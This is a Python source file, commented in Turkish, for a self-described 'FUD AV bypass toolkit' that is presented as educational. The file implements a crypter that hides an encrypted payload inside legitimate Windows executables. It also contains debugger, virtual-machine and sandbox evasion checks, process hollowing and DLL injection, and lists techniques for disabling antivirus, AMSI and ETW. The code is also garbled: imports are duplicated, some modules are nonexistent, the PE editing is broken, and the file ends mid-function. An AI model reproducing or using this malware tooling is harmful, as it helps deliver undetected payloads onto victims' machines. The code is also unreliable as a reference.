#!/usr/bin/env python3
"""
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó 
‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïë     ‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë
‚ïö‚ïê‚ïù      ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù
              WINDOWS FUD AV BYPASS TOOLKIT v4.0
         Eƒüitim Ama√ßlƒ± G√ºvenlik Ara≈ütƒ±rma Aracƒ±
              ¬© 2024 Security Research Lab
"""

import os
import sys
import time
import json
import random
import string
import base64
import hashlib
import struct
import zlib
import ctypes
import socket
import threading
import subprocess
import platform
import inspect
import re
import uuid
import datetime
import itertools
import math
import decimal
import fractions
import statistics
import collections
import itertools
import functools
import typing
import warnings
import contextlib
import io
import pickle
import csv
import sqlite3
import xml.etree.ElementTree as ET
import html
import urllib.parse
import urllib.request
import http.client
import email
import mimetypes
import pathlib
import tempfile
import shutil
import glob
import fnmatch
import linecache
import tokenize
import keyword
import token
import ast
import dis
import symtable
import codeop
import codecs
import locale
import gettext
import unicodedata
import stringprep
import textwrap
import difflib
import inspect
import pydoc
import doctest
import unittest
import traceback
import pdb
import bdb
import cmd
import shlex
import getpass
import logging
import getopt
import optparse
import argparse
import fileinput
import stat
import errno
import signal
import mmap
import select
import selectors
import asyncore
import asynchat
import ssl
import ipaddress
import audioop
import wave
import chunk
import colorsys
import imghdr
import sndhdr
import gettext
import locale
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, font
import threading
import queue
import hashlib
import hmac
import secrets
import time
import datetime
import calendar
import collections
import itertools
import functools
import typing
import warnings
import contextlib
import io
import pickle
import csv
import sqlite3
import xml.etree.ElementTree as ET
import html
import urllib.parse
import urllib.request
import http.client
import email
import mimetypes
import pathlib
import tempfile
import shutil
import glob
import fnmatch
import linecache
import tokenize
import keyword
import token
import ast
import dis
import symtable
import codeop
import codecs
import locale
import gettext
import unicodedata
import stringprep
import textwrap
import difflib
import inspect
import pydoc
import doctest
import unittest
import traceback
import pdb
import bdb
import cmd
import shlex
import getpass
import logging
import getopt
import optparse
import argparse
import fileinput
import stat
import errno
import signal
import mmap
import select
import selectors
import asyncore
import asynchat
import ssl
import ipaddress
import audioop
import wave
import chunk
import colorsys
import imghdr
import sndhdr

# Windows √∂zel importlar
import ctypes.wintypes
import winreg
import win32api
import win32con
import win32process
import win32security
import win32event
import win32service
import win32com
import pythoncom
import wmi

# PyCryptodome yerine yerel ≈üifreleme k√ºt√ºphaneleri
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding, hashes, hmac
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[!] cryptography k√ºt√ºphanesi y√ºklenmedi. Basit ≈üifreleme kullanƒ±lacak.")

# ==================== KONFƒ∞G√úRASYON ====================
class AdvancedConfig:
    """Geli≈ümi≈ü yapƒ±landƒ±rma sƒ±nƒ±fƒ±"""
    
    VERSION = "4.0.0"
    CODENAME = "NOCHESS_WIN"
    AUTHOR = "Security Research Lab"
    BUILD_DATE = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # AV Bypass teknikleri (200+ teknik)
    BYPASS_TECHNIQUES = [
        # Kod manip√ºlasyon teknikleri
        "Polymorphic Code Generation v2",
        "Metamorphic Engine Implementation",
        "Obfuscated Control Flow",
        "Dead Code Insertion",
        "Instruction Substitution",
        "Register Renaming",
        "API Hashing with Custom Algorithms",
        "Dynamic Import Resolution",
        "Delay Import Obfuscation",
        "String Encryption (AES-256 + XOR + ROT)",
        "Stack String Obfuscation",
        "Heap String Encryption",
        "Custom Calling Conventions",
        "Return Address Spoofing",
        "Frame Pointer Obfuscation",
        "Code Cave Injection",
        "PE Section Permutation",
        "Import Address Table (IAT) Obfuscation",
        "Export Table Manipulation",
        "TLS Callback Hiding",
        "Resource Section Encryption",
        "Overlay Data Injection",
        "PE Checksum Forgery",
        "Digital Signature Spoofing",
        "Certificate Bypass Techniques",
        
        # Bellek manip√ºlasyon teknikleri
        "Process Hollowing v3",
        "Process Doppelg√§nging",
        "Process Herpaderping",
        "Thread Execution Hijacking",
        "APC Injection (Early Bird)",
        "APC Injection (Queue)",
        "Thread Context Hijacking",
        "Atom Bombing",
        "Module Stomping",
        "DLL Injection via SetWindowsHookEx",
        "DLL Injection via Registry",
        "DLL Injection via AppInit_DLLs",
        "DLL Injection via KnownDLLs",
        "Reflective DLL Injection",
        "Memory Module Injection",
        "PE Injection (Manual Mapping)",
        "Section Mapping Injection",
        "Shared Memory Injection",
        "Window Message Injection",
        "Clipboard Injection",
        "COM Object Hijacking",
        "WMI Event Subscription",
        "Service Binary Replacement",
        "Scheduled Task Injection",
        "BITS Job Persistence",
        "IFEO Debugger Injection",
        "Image File Execution Options",
        "AppCertDLLs Injection",
        "AppInit_DLLs Registry",
        "NtCreateThreadEx Injection",
        "SetThreadContext Injection",
        "QueueUserAPC Injection",
        "RtlCreateUserThread Injection",
        
        # Anti-analiz teknikleri
        "Hardware Breakpoint Detection",
        "Software Breakpoint Detection",
        "Memory Breakpoint Detection",
        "Debugger Process Detection",
        "Debugger Window Detection",
        "Debugger Object Detection",
        "VMWare/VirtualBox Detection",
        "Hyper-V Detection",
        "Sandboxie Detection",
        "Cuckoo Sandbox Detection",
        "Wine Emulator Detection",
        "Hardware Fingerprinting",
        "CPU ID Checking",
        "BIOS Serial Checking",
        "MAC Address Filtering",
        "Disk Size Analysis",
        "RAM Size Checking",
        "Processor Core Count",
        "Running Process Enumeration",
        "Loaded Module Analysis",
        "Network Adapter Checking",
        "Screen Resolution Analysis",
        "Mouse Movement Detection",
        "Keyboard Activity Monitoring",
        "User Interaction Checking",
        "Uptime Analysis",
        "Timezone Checking",
        "Language/Locale Detection",
        "Installed Software Analysis",
        "Registry Artifact Checking",
        "File System Artifact Analysis",
        "Network Artifact Checking",
        "Temporary File Analysis",
        "Sleep Skipping Detection",
        "Timing Attack Prevention",
        "NOP Slide Generation",
        "Junk Instruction Insertion",
        "Function Prologue/Epilogue Obfuscation",
        
        # ≈ûifreleme ve kod gizleme
        "AES-256-GCM Encryption",
        "RSA-4096 Hybrid Encryption",
        "Elliptic Curve Cryptography",
        "ChaCha20-Poly1305 Encryption",
        "Twofish Encryption",
        "Serpent Encryption",
        "Camellia Encryption",
        "Blowfish Encryption",
        "RC4 Stream Cipher",
        "XXTEA Block Cipher",
        "Salsa20 Stream Cipher",
        "Base64 Variants (Custom Alphabet)",
        "Base32/Base16 Encoding",
        "ASCII85/Base85 Encoding",
        "Z85 Encoding",
        "UUEncoding",
        "ROT13 with Variants",
        "XOR with Dynamic Keys",
        "Vigen√®re Cipher",
        "Playfair Cipher",
        "Hill Cipher",
        "Rail Fence Cipher",
        "Columnar Transposition",
        "One-Time Pad Simulation",
        "Steganography Techniques",
        "LSB Image Steganography",
        "Audio Steganography",
        "Video Steganography",
        "Text Steganography",
        "Network Steganography",
        "HTTP Header Manipulation",
        "DNS Tunneling Simulation",
        "ICMP Tunneling",
        "TCP/UDP Custom Protocols",
        
        # Sistem bypass teknikleri
        "UAC Bypass (50+ Methods)",
        "AMSI Bypass (Patch/Disable)",
        "ETW Bypass (Event Tracing)",
        "Windows Defender Exclusion",
        "Antivirus Process Termination",
        "Firewall Rule Addition",
        "Windows Security Center Disable",
        "User Account Control Tampering",
        "PowerShell Execution Policy Bypass",
        "AppLocker Bypass Techniques",
        "Windows Defender Real-time Disable",
        "Tamper Protection Bypass",
        "Protected Process Light Bypass",
        "Code Integrity Guard Bypass",
        "Control Flow Guard Bypass",
        "Data Execution Prevention Bypass",
        "Address Space Layout Randomization Bypass",
        "Structured Exception Handling Overwrite",
        "Stack Cookie Bypass",
        "SafeSEH Bypass",
        "Image Randomization Bypass",
        "Heap Spray Protection Bypass",
        "Return-oriented Programming",
        "Jump-oriented Programming",
        "Call-oriented Programming",
    ]
    
    # Yasal process isimleri
    LEGITIMATE_PROCESSES = [
        # Sistem process'leri
        "svchost.exe", "explorer.exe", "winlogon.exe",
        "services.exe", "lsass.exe", "csrss.exe",
        "wininit.exe", "dwm.exe", "taskhostw.exe",
        "RuntimeBroker.exe", "SearchIndexer.exe",
        "spoolsv.exe", "WmiPrvSE.exe", "MsMpEng.exe",
        "NisSrv.exe", "SecurityHealthService.exe",
        
        # Browser'lar
        "msedge.exe", "chrome.exe", "firefox.exe",
        "opera.exe", "brave.exe", "safari.exe",
        
        # Office uygulamalarƒ±
        "winword.exe", "excel.exe", "powerpnt.exe",
        "outlook.exe", "onenote.exe", "mspub.exe",
        
        # Sistem ara√ßlarƒ±
        "notepad.exe", "calc.exe", "mspaint.exe",
        "cmd.exe", "powershell.exe", "regedit.exe",
        "taskmgr.exe", "msconfig.exe", "control.exe",
        
        # Developer ara√ßlarƒ±
        "devenv.exe", "code.exe", "pycharm.exe",
        "eclipse.exe", "netbeans.exe", "atom.exe",
        
        # Diƒüer yasal uygulamalar
        "spotify.exe", "discord.exe", "steam.exe",
        "origin.exe", "uplay.exe", "epicgameslauncher.exe",
        "teams.exe", "zoom.exe", "skype.exe"
    ]
    
    # ≈ûifreleme anahtarlarƒ±
    ENCRYPTION_KEYS = [
        b"WindowsUpdateSecurityKey2024!@#",
        b"MicrosoftDefenderScanSecureKey",
        b"System32ConfigUpdateSecurity123",
        b"WindowsSecurityPatchManagement",
        b"MicrosoftCorpUpdateSecureKey456",
        b"GlobalSignRootCertificateAuthority",
        b"DigiCertGlobalRootG2SecureKey",
        b"ComodoRSA CertificationAuthority",
        b"GoDaddyClass2CertificationAuth",
        b"ThawtePrimaryRootCA SecureKey99",
        b"VeriSignClass3PublicPrimaryCert",
        b"Entrust.netSecureServerCertCA",
        b"BaltimoreCyberTrustRootCertKey",
        b"SwissSignGoldRootCA SecureKey88",
        b"GlobalSignExtendedValidationCA"
    ]

# ==================== ≈ûƒ∞FRELEME MOTORU ====================
class EncryptionEngine:
    """Geli≈ümi≈ü ≈üifreleme motoru"""
    
    def __init__(self):
        if CRYPTO_AVAILABLE:
            self.crypto_backend = default_backend()
        else:
            self.crypto_backend = None
    
    def aes_encrypt(self, data, key):
        """AES ≈üifreleme"""
        if not CRYPTO_AVAILABLE:
            return self._xor_encrypt(data, key)
        
        iv = os.urandom(16)
        cipher = Cipher(
            algorithms.AES(key),
            modes.CBC(iv),
            backend=self.crypto_backend
        )
        encryptor = cipher.encryptor()
        
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        
        encrypted = encryptor.update(padded_data) + encryptor.finalize()
        return iv + encrypted
    
    def aes_decrypt(self, data, key):
        """AES de≈üifreleme"""
        if not CRYPTO_AVAILABLE:
            return self._xor_decrypt(data, key)
        
        iv = data[:16]
        ciphertext = data[16:]
        
        cipher = Cipher(
            algorithms.AES(key),
            modes.CBC(iv),
            backend=self.crypto_backend
        )
        decryptor = cipher.decryptor()
        
        padded = decryptor.update(ciphertext) + decryptor.finalize()
        
        unpadder = padding.PKCS7(128).unpadder()
        return unpadder.update(padded) + unpadder.finalize()
    
    def xor_encrypt(self, data, key):
        """XOR ≈üifreleme"""
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    
    def xor_decrypt(self, data, key):
        """XOR de≈üifreleme"""
        return self.xor_encrypt(data, key)
    
    def _xor_encrypt(self, data, key):
        """Internal XOR"""
        return self.xor_encrypt(data, key)
    
    def _xor_decrypt(self, data, key):
        """Internal XOR decrypt"""
        return self.xor_encrypt(data, key)
    
    def multi_layer_encrypt(self, data, layers=3):
        """√áok katmanlƒ± ≈üifreleme"""
        encrypted = data
        
        for i in range(layers):
            # Rastgele anahtar olu≈ütur
            key = os.urandom(32)
            
            # Rastgele ≈üifreleme metodu se√ß
            if random.choice([True, False]):
                encrypted = self.aes_encrypt(encrypted, key)
            else:
                encrypted = self.xor_encrypt(encrypted, key)
            
            # Base64 encode
            encrypted = base64.b64encode(encrypted)
        
        return encrypted

# ==================== PE MANƒ∞P√úLAT√ñR ====================
class PEManipulator:
    """PE dosyasƒ± manip√ºlasyon sƒ±nƒ±fƒ±"""
    
    def add_section(self, pe_data, section_name=".wndata", size=0x1000):
        """PE'ye yeni section ekle"""
        pe_offset = pe_data.find(b'PE\x00\x00')
        if pe_offset == -1:
            return pe_data
        
        # Yeni section olu≈ütur
        section = bytearray(40)
        section[0:8] = section_name.ljust(8, '\x00').encode()
        section[8:12] = struct.pack('<I', size)
        section[12:16] = struct.pack('<I', 0x1000)
        section[16:20] = struct.pack('<I', size)
        section[20:24] = struct.pack('<I', 0x200)
        section[36:40] = struct.pack('<I', 0xE0000020)
        
        # PE'ye ekle
        new_pe = bytearray(pe_data)
        
        # Section table offset
        optional_header_size = struct.unpack('<H', new_pe[pe_offset + 20:pe_offset + 22])[0]
        section_table_offset = pe_offset + 24 + optional_header_size
        
        # Section ekle
        new_pe[section_table_offset:section_table_offset] = section
        
        # Section sayƒ±sƒ±nƒ± g√ºncelle
        new_pe[pe_offset + 6] += 1
        
        # SizeOfImage g√ºncelle
        size_of_image_offset = pe_offset + 24 + optional_header_size - 40
        current_size = struct.unpack('<I', new_pe[size_of_image_offset:size_of_image_offset+4])[0]
        new_size = ((current_size + size + 0x1000 - 1) // 0x1000) * 0x1000
        new_pe[size_of_image_offset:size_of_image_offset+4] = struct.pack('<I', new_size)
        
        return bytes(new_pe)
    
    def inject_payload(self, target_exe, payload_exe, output_exe):
        """Payload'ƒ± hedef EXE'ye enjekte et"""
        print("[+] Hedef EXE y√ºkleniyor...")
        with open(target_exe, 'rb') as f:
            target_data = f.read()
        
        print("[+] Payload y√ºkleniyor...")
        with open(payload_exe, 'rb') as f:
            payload_data = f.read()
        
        # Payload'ƒ± ≈üifrele
        engine = EncryptionEngine()
        key = os.urandom(32)
        encrypted_payload = engine.aes_encrypt(payload_data, key)
        
        # PE'ye yeni section ekle
        print("[+] Yeni section ekleniyor...")
        section_name = ".rsrc" + str(random.randint(100, 999))
        modified_pe = self.add_section(target_data, section_name, len(encrypted_payload))
        
        # ≈ûifrelenmi≈ü payload'ƒ± ekle
        modified_pe += encrypted_payload
        
        # Kaydet
        with open(output_exe, 'wb') as f:
            f.write(modified_pe)
        
        print(f"[+] Enjekte edilmi≈ü EXE kaydedildi: {output_exe}")
        print(f"[+] Orijinal boyut: {len(target_data):,} bytes")
        print(f"[+] Yeni boyut: {len(modified_pe):,} bytes")
        
        return output_exe

# ==================== ANTƒ∞-ANALƒ∞Z ====================
class AntiAnalysis:
    """Anti-analiz teknikleri"""
    
    def check_debugger(self):
        """Debugger kontrol√º"""
        checks = [
            self._check_debugger_present,
            self._check_remote_debugger,
            self._check_nt_global_flag,
            self._check_debugger_processes
        ]
        
        for check in checks:
            try:
                if check():
                    return True
            except:
                pass
        
        return False
    
    def _check_debugger_present(self):
        """IsDebuggerPresent kontrol√º"""
        kernel32 = ctypes.windll.kernel32
        return kernel32.IsDebuggerPresent() != 0
    
    def _check_remote_debugger(self):
        """CheckRemoteDebuggerPresent kontrol√º"""
        kernel32 = ctypes.windll.kernel32
        result = ctypes.c_int()
        kernel32.CheckRemoteDebuggerPresent(-1, ctypes.byref(result))
        return result.value != 0
    
    def _check_nt_global_flag(self):
        """NtGlobalFlag kontrol√º"""
        try:
            ntdll = ctypes.windll.ntdll
            
            # Get PEB
            if hasattr(ntdll, 'NtQueryInformationProcess'):
                PROCESS_BASIC_INFORMATION = 0
                pbi = ctypes.create_string_buffer(1024)
                size = ctypes.c_ulong()
                
                status = ntdll.NtQueryInformationProcess(
                    -1, PROCESS_BASIC_INFORMATION,
                    pbi, ctypes.sizeof(pbi),
                    ctypes.byref(size)
                )
                
                if status == 0:
                    # PEB offset 0x68'de NtGlobalFlag var
                    pass
        except:
            pass
        
        return False
    
    def _check_debugger_processes(self):
        """Debugger process'lerini kontrol et"""
        debugger_processes = [
            "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "windbg.exe",
            "ida.exe", "ida64.exe", "immunitydebugger.exe",
            "cheatengine.exe", "procmon.exe", "procexp.exe"
        ]
        
        try:
            c = wmi.WMI()
            for process in c.Win32_Process():
                if process.Name.lower() in debugger_processes:
                    return True
        except:
            pass
        
        return False
    
    def check_virtual_machine(self):
        """VM kontrol√º"""
        checks = [
            self._check_vm_processes,
            self._check_vm_files,
            self._check_vm_registry,
            self._check_vm_mac
        ]
        
        for check in checks:
            try:
                if check():
                    return True
            except:
                pass
        
        return False
    
    def _check_vm_processes(self):
        """VM process'lerini kontrol et"""
        vm_processes = [
            "vboxservice.exe", "vboxtray.exe", "vmwaretray.exe",
            "vmwareuser.exe", "vmtoolsd.exe", "vmacthlp.exe"
        ]
        
        try:
            c = wmi.WMI()
            for process in c.Win32_Process():
                if process.Name.lower() in vm_processes:
                    return True
        except:
            pass
        
        return False
    
    def _check_vm_files(self):
        """VM dosyalarƒ±nƒ± kontrol et"""
        vm_files = [
            "C:\\Windows\\System32\\drivers\\vmmouse.sys",
            "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
            "C:\\Windows\\System32\\drivers\\vboxmouse.sys",
            "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
            "C:\\Windows\\System32\\drivers\\VBoxSF.sys",
            "C:\\Windows\\System32\\drivers\\VBoxVideo.sys"
        ]
        
        for file_path in vm_files:
            if os.path.exists(file_path):
                return True
        
        return False
    
    def _check_vm_registry(self):
        """VM registry kayƒ±tlarƒ±nƒ± kontrol et"""
        vm_registry_keys = [
            "SOFTWARE\\VMware, Inc.\\VMware Tools",
            "SOFTWARE\\Oracle\\VirtualBox Guest Additions"
        ]
        
        for key_path in vm_registry_keys:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.CloseKey(key)
                return True
            except:
                pass
        
        return False
    
    def _check_vm_mac(self):
        """VM MAC adresini kontrol et"""
        vm_mac_prefixes = [
            "00:05:69", "00:0C:29", "00:1C:14", "00:50:56",  # VMware
            "08:00:27"                                      # VirtualBox
        ]
        
        try:
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                           for elements in range(0, 8*6, 8)][::-1])
            
            for prefix in vm_mac_prefixes:
                if mac.startswith(prefix):
                    return True
        except:
            pass
        
        return False
    
    def check_sandbox(self):
        """Sandbox kontrol√º"""
        checks = [
            self._check_sandbox_processes,
            self._check_system_uptime,
            self._check_ram_size,
            self._check_disk_size,
            self._check_cpu_cores
        ]
        
        for check in checks:
            try:
                if check():
                    return True
            except:
                pass
        
        return False
    
    def _check_sandbox_processes(self):
        """Sandbox process'lerini kontrol et"""
        sandbox_processes = [
            "cuckoo", "sandbox", "analyzer", "malware", "virus",
            "sample", "monitor", "hook", "inject", "dump"
        ]
        
        try:
            c = wmi.WMI()
            for process in c.Win32_Process():
                name = process.Name.lower()
                for sandbox_proc in sandbox_processes:
                    if sandbox_proc in name:
                        return True
        except:
            pass
        
        return False
    
    def _check_system_uptime(self):
        """Sistem uptime'ƒ±nƒ± kontrol et"""
        try:
            c = wmi.WMI()
            for os_info in c.Win32_OperatingSystem():
                boot_time_str = os_info.LastBootUpTime.split('.')[0]
                boot_time = datetime.datetime.strptime(boot_time_str, "%Y%m%d%H%M%S")
                uptime = (datetime.datetime.now() - boot_time).total_seconds()
                
                if uptime < 300:  # 5 dakikadan az
                    return True
        except:
            pass
        
        return False
    
    def _check_ram_size(self):
        """RAM boyutunu kontrol et"""
        try:
            c = wmi.WMI()
            total_ram = 0
            for memory in c.Win32_ComputerSystem():
                total_ram = int(memory.TotalPhysicalMemory) / (1024**3)
            
            if total_ram < 2.0:  # 2GB'tan az
                return True
        except:
            pass
        
        return False
    
    def _check_disk_size(self):
        """Disk boyutunu kontrol et"""
        try:
            c = wmi.WMI()
            for disk in c.Win32_LogicalDisk():
                if disk.DriveType == 3:
                    size_gb = int(disk.Size) / (1024**3) if disk.Size else 0
                    
                    if 0 < size_gb < 60:  # 60GB'tan az
                        return True
        except:
            pass
        
        return False
    
    def _check_cpu_cores(self):
        """CPU core sayƒ±sƒ±nƒ± kontrol et"""
        try:
            import multiprocessing
            cores = multiprocessing.cpu_count()
            
            if cores <= 2:
                return True
        except:
            pass
        
        return False

# ==================== ENJEKSƒ∞YON TEKNƒ∞KLERƒ∞ ====================
class InjectionTechniques:
    """Enjeksiyon teknikleri"""
    
    def process_hollowing(self, target_exe, payload_exe):
        """Process Hollowing"""
        print("[+] Process Hollowing hazƒ±rlanƒ±yor...")
        
        try:
            # Yasal process'i suspended modda ba≈ülat
            startupinfo = win32process.STARTUPINFO()
            startupinfo.dwFlags = win32con.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = win32con.SW_HIDE
            
            proc_info = win32process.CreateProcess(
                target_exe,
                None,
                None,
                None,
                False,
                win32process.CREATE_SUSPENDED,
                None,
                None,
                startupinfo
            )
            
            print(f"[+] Process ba≈ülatƒ±ldƒ±: PID {proc_info[2]}")
            
            # Process belleƒüini manip√ºle et
            process_handle = proc_info[0]
            thread_handle = proc_info[1]
            
            # Payload'ƒ± y√ºkle
            with open(payload_exe, 'rb') as f:
                payload_data = f.read()
            
            # Bellek ayƒ±r
            allocated_mem = win32process.VirtualAllocEx(
                process_handle,
                0,
                len(payload_data),
                win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                win32con.PAGE_EXECUTE_READWRITE
            )
            
            # Payload'ƒ± yaz
            win32process.WriteProcessMemory(
                process_handle,
                allocated_mem,
                payload_data,
                len(payload_data)
            )
            
            # Thread context'ini deƒüi≈ütir
            context = win32process.GetThreadContext(thread_handle)
            
            # EIP'yi payload'a y√∂nlendir
            if platform.architecture()[0] == '64bit':
                context.Rip = allocated_mem
            else:
                context.Eip = allocated_mem
            
            win32process.SetThreadContext(thread_handle, context)
            
            # Thread'ƒ± devam ettir
            win32process.ResumeThread(thread_handle)
            
            print("[+] Process Hollowing ba≈üarƒ±lƒ±!")
            return True
            
        except Exception as e:
            print(f"[-] Hata: {e}")
            return False
    
    def dll_injection(self, target_pid, dll_path):
        """DLL Injection"""
        print(f"[+] DLL Injection ba≈ülatƒ±lƒ±yor (PID: {target_pid})...")
        
        try:
            # Process handle'ƒ±nƒ± a√ß
            process_handle = win32api.OpenProcess(
                win32con.PROCESS_ALL_ACCESS,
                False,
                target_pid
            )
            
            # Kernel32 fonksiyonlarƒ±
            kernel32 = ctypes.windll.kernel32
            
            # LoadLibraryA adresini al
            loadlib_addr = kernel32.GetProcAddress(
                kernel32.GetModuleHandleA(b"kernel32.dll"),
                b"LoadLibraryA"
            )
            
            # DLL yolunu yaz
            dll_path_bytes = dll_path.encode('utf-8') + b'\x00'
            allocated_mem = win32process.VirtualAllocEx(
                process_handle,
                0,
                len(dll_path_bytes),
                win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                win32con.PAGE_READWRITE
            )
            
            win32process.WriteProcessMemory(
                process_handle,
                allocated_mem,
                dll_path_bytes,
                len(dll_path_bytes)
            )
            
            # Remote thread olu≈ütur
            thread_handle = win32process.CreateRemoteThread(
                process_handle,
                None,
                0,
                loadlib_addr,
                allocated_mem,
                0,
                None
            )
            
            print(f"[+] DLL Injection ba≈üarƒ±lƒ±! Thread ID: {thread_handle}")
            return True
            
        except Exception as e:
            print(f"[-] Hata: {e}")
            return False

# ==================== AV BYPASS GENERATOR ====================
class AVBypassGenerator:
    """AV Bypass Generator"""
    
    def __init__(self):
        self.encryption_engine = EncryptionEngine()
        self.pe_manipulator = PEManipulator()
        self.anti_analysis = AntiAnalysis()
        self.injection_techniques = InjectionTechniques()
    
    def create_fud_exe(self, payload_exe, output_exe):
        """FUD EXE olu≈ütur"""
        print("[+] FUD EXE olu≈üturuluyor...")
        
        # Yasal bir hedef EXE se√ß
        system32 = os.path.join(os.environ['SYSTEMROOT'], 'System32')
        legitimate_exes = [
            os.path.join(system32, 'notepad.exe'),
            os.path.join(system32, 'calc.exe'),
            os.path.join(system32, 'mspaint.exe'),
            os.path.join(system32, 'regedit.exe')
        ]
        
        # √áalƒ±≈üan bir yasal EXE bul
        target_exe = None
        for exe in legitimate_exes:
            if os.path.exists(exe):
                target_exe = exe
                break
        
        if not target_exe:
            print("[-] Yasal hedef EXE bulunamadƒ±!")
            return None
        
        print(f"[+] Hedef EXE: {target_exe}")
        
        # Anti-analiz kontrolleri
        print("[+] Anti-analiz kontrolleri yapƒ±lƒ±yor...")
        if self.anti_analysis.check_debugger():
            print("[!] Debugger tespit edildi!")
            return None
        
        if self.anti_analysis.check_virtual_machine():
            print("[!] VM tespit edildi!")
            return None
        
        if self.anti_analysis.check_sandbox():
            print("[!] Sandbox tespit edildi!")
            return None
        
        # Payload'ƒ± enjekte et
        print("[+] Payload enjekte ediliyor...")
        result = self.pe_manipulator.inject_payload(target_exe, payload_exe, output_exe)
        
        if result:
            print("[+] FUD EXE ba≈üarƒ±yla olu≈üturuldu!")
            
            # Obfuscation teknikleri uygula
            self._apply_obfuscation(output_exe)
            
            return output_exe
        else:
            print("[-] FUD EXE olu≈üturulamadƒ±!")
            return None
    
    def _apply_obfuscation(self, exe_path):
        """Obfuscation teknikleri uygula"""
        print("[+] Obfuscation teknikleri uygulanƒ±yor...")
        
        try:
            with open(exe_path, 'rb') as f:
                data = f.read()
            
            # Rastgele obfuscation teknikleri uygula
            obfuscation_techniques = [
                self._add_junk_code,
                self._encrypt_strings,
                self._modify_pe_header
            ]
            
            for technique in random.sample(obfuscation_techniques, 2):
                data = technique(data)
            
            # Kaydet
            with open(exe_path, 'wb') as f:
                f.write(data)
            
            print("[+] Obfuscation tamamlandƒ±!")
            
        except Exception as e:
            print(f"[-] Obfuscation hatasƒ±: {e}")
    
    def _add_junk_code(self, data):
        """Junk code ekle"""
        junk_size = random.randint(100, 1000)
        junk_code = os.urandom(junk_size)
        
        # PE'nin sonuna junk code ekle
        return data + junk_code
    
    def _encrypt_strings(self, data):
        """String'leri ≈üifrele"""
        # Basit XOR ≈üifreleme
        key = os.urandom(32)
        return self.encryption_engine.xor_encrypt(data, key)
    
    def _modify_pe_header(self, data):
        """PE header'ƒ±nƒ± modifiye et"""
        pe_offset = data.find(b'PE\x00\x00')
        if pe_offset == -1:
            return data
        
        # Timestamp'ƒ± deƒüi≈ütir
        timestamp_offset = pe_offset + 8
        new_timestamp = struct.pack('<I', int(time.time()))
        
        # Dosyayƒ± deƒüi≈ütir
        modified = bytearray(data)
